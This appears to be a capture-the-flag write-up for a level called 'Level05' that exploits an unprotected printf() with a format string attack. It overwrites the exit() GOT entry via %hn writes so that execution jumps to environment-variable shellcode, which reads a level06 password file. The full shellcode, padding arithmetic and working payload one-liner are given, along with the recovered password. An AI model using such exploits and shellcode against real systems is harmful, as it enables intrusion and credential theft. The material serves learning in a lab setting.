# Level05

This binary features a simple `fgets()` input to an unprotected `printf()`, enabling us to do a **format string attack**.		
We can export some shellcode, and replace the `exit()` relocation address in the `GOT` to target our **shellcode** instead.		
However the offset is too great to write the address in one go using `%n`. We will have to write it 2 bytes at a time with the `short` modifier `(%hn)`.		

```bash
gdb level05
disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
...

export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass'

using getenv.c
gcc -m32 getenv.c
./a.out
0xffffd87c
```

The address of `exit()` in `got` is `0x080497e0`.		
The address of our **shellcode** is `0xffffd87c`.		

```bash
./level05
aaaabbbb%10$p%11$p
aaaabbbb0x616161610x62626262
```

We can pass our 2 addresses at the start of our buffer and access them in $10 and $11 parameter indexes.		

The tricky part is calculating the correct padding that will determine what value each use of %n will print.		
```bash
0xffffd87c
printf %d 0xffff
65535
printf %d 0xd87c
55420		; value of first padding before substracting address string sizes (8)
65535-55420
10115		; value of second padding
```

Its important to keep in mind that changing the value of the first padding must be reflected in the second padding value since it is a difference.		

Each use of `%n` does not reset the counter so we must use the lowest value first as padding, the padding value for the second `%n` will be total padding - first padding (only  subtract the address strings (8) from the first padding so as not to count it twice in the second padding).		

```bash
python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55412d%10\$hn' + '%10115d%11\$hn'" | ./level05
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
